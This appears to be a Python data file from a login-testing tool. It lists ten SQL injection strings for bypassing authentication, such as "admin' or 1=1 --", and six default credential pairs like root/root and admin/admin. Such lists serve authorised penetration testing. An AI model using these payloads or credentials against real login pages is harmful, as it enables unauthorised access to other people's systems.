sql_injections = [
    ("admin' --", "password"),
    ("admin' or 1=1 --", "password"),
    ("admin';--", "password"),
    ("admin';#", "password"),
    ("admin';/*", "password"),
    ("admin'/*", "password"),
    ("' or 1=1--", "password"),
    ("' or '1'='1", "password"),
    ("' or 1=1#", "password"),
    ("' or 1=1", "password")
]

default_auth_info = [
    ("root", "root"),
    ("root", "password"),
    ("admin", "admin"),
    ("admin", "password"),
    ("test", "test"),
    ("system", "system")
]
